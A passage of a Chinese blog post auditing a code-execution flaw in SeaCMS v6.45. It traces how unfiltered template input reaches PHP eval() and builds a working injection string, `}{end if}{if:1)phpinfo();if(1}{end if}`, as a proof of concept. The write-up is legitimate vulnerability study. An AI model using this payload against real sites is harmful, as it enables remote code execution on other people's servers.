class="hljs-string">&quot;)&#123;\$resultStr=\&quot;<span class="hljs-subst">&#123;$strElseIfThen0&#125;</span>\&quot;;\$elseIfFlag=true;&#125;&quot;</span>);<br>                <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$resultStr</span>, <span class="hljs-variable">$content</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>可以看到下面存在<code>eval()</code>函数来执行代码，要想进入到<code>eval()</code>，<code>$content</code>中必须含有<code>&#123;if:</code>字符串。</p>
+<p>然后是正则，</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-symbol">$la</span>belRule = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>,<span class="hljs-string">&quot;is&quot;</span>);<br>preg_match_all(<span class="hljs-symbol">$la</span>belRule,<span class="hljs-symbol">$co</span>ntent,<span class="hljs-symbol">$iar</span>);<br></code></pre></td></tr></table></figure>
+<p>看代码执行流程，在<code>eval()</code>函数中，<code>$strIf</code>就是之前<code>preg_match_all()</code>中第一个<code>(.*?)</code>匹配出来的值。</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">@eval(<span class="hljs-string">&quot;if(&quot;</span>.<span class="hljs-variable">$strIf</span>.<span class="hljs-string">&quot;)&#123;\<span class="hljs-variable">$ifFlag</span>=true;&#125;else&#123;\<span class="hljs-variable">$ifFlag</span>=false;&#125;&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p>在<code>eval()</code>中，要闭合前面的if语句，可以构造<code>1)phpinfo();if(1</code>，又要符合正则<code>&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;</code>，再看标签：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;最新上映&lt;/a&gt;<br></code></pre></td></tr></table></figure>
+<p>由于<code>$order</code>替换的是<code>&#123;searchpage:ordername&#125;</code>，所以，在<code>1)phpinfo();if(1</code>基础上添加。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125;&#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)phpinfo();<span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>漏洞利用的基本流程就是这样，简单来说，就是有个可控的变量没有经过过滤，就被带入了<code>eval()</code>中，导致了代码执行。</p>
+<h3 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h3><p><a target="_blank" rel="noopener" href="https://github.com/SecWiki/CMS-Hunter/tree/master/seacms/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">SeaCMS v6.45前台Getshell 代码执行 </a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">代码执行</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/10/20/CTF-Volatility/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">使用Volatility解决CTF取证类题目</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/04/18/HITBXCTF2018-Baby-baby-upload/">
+                        <span class="hidden-mobile">HITBXCTF2018-Baby baby && upload</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
